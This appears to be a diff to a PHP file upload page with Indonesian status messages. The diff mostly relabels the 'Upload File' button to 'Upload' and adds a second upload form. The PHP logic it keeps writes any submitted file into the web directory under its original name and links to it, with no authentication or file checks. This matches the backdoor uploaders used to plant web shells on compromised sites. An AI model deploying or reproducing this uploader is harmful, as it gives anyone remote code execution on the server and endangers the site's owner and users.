@@ -98,7 +98,7 @@ echo '<div class="row justify-content-center">
 <div class="custom-file">
 <form method="post" enctype="multipart/form-data" name="uploader" id="uploader">
 <input type="file" class="custom-file-input" name="file">
-<input name="_upl" type="submit" id="_upl" value="Upload File" class="input-group-text">
+<input name="_upl" type="submit" id="_upl" value="Upload" class="input-group-text">
 </form>
 </div>
 </div><br/>
@@ -107,13 +107,15 @@ echo '<div class="row justify-content-center">
 <div class="custom-file">
 <form method="post" enctype="multipart/form-data" type="file" class="custom-file-input" id="uploader" aria-describedby="uploader"><label class="custom-file-label" for="uploader">Choose file</label></div>
 <div class="input-group-append"> 
-<input name="_upl" class="btn btn-secondary" type="submit" id="_upl" value="Upload File"> </div></form> </div>
+<input name="_upl" class="btn btn-secondary" type="submit" id="_upl" value="Upload"> </div></form> </div><br/>
+
+<div class="input-group"> <div class="custom-file"> <input type="file" class="custom-file-input" id="inputGroupFile04" aria-describedby="_upl"> <label class="custom-file-label" for="inputGroupFile04">Choose file</label> </div> <div class="input-group-append"> <button class="btn btn-outline-secondary" type="button" id="_upl">Upload</button> </div> </div>
 
 </div>
 </div>
 </div>
 </section>';
-if( $_POST['_upl'] == "Upload File" ) {
+if( $_POST['_upl'] == "Upload" ) {
 if(@copy($_FILES['file']['tmp_name'], $_FILES['file']['name'])) { echo '<div class="alert alert-success text-center" role="alert">File “<u><b><a title="Visit Link" href="./'.$_FILES['file']['name'].'">'.$_FILES['file']['name'].'</a></b></u>” berhasil diupload...!!!</div><br/><br/>'; }
 else { echo '<div class="alert alert-danger text-center" role="alert">File gagal diupload...!!!</div><br/><br/>'; }
 }
